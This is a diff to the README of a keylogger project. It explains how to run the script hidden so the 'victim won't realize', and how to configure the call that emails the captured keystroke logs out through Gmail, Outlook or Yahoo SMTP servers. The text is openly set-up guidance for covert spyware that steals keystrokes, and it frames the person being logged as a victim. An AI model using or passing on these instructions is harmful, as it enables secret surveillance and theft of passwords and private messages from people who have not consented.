@@ -15,17 +15,20 @@ automatically run keylogger.pyw (without a terminal) so victim won't realize
 
 ## Getting log file 
 
-I used SMTP library in this project - change library in the mail function if you want 
+  Server Name 	SMTP Server 	SMTP Port
+GMAIL 	smtp.gmail.com 	587
+OUTLOOK 	smtp-mail.outlook.com 	587
+YAHOO 	smtp.mail.yahoo.com 	587
+
 
 You have to :
 
 - open a new gmail account
 
- ---  mail_send("", "", log_msg)  ----
+         mail_send(your-email@gmail.com, your-passwd, log_msg)  ---- Do not touch log_msg
 
 - enter your address instead of first ""
 
 - enter your password instead of second ""
 
 - It is set to send mails to the mail you give (that means you send logs to yourself with your account)
-  
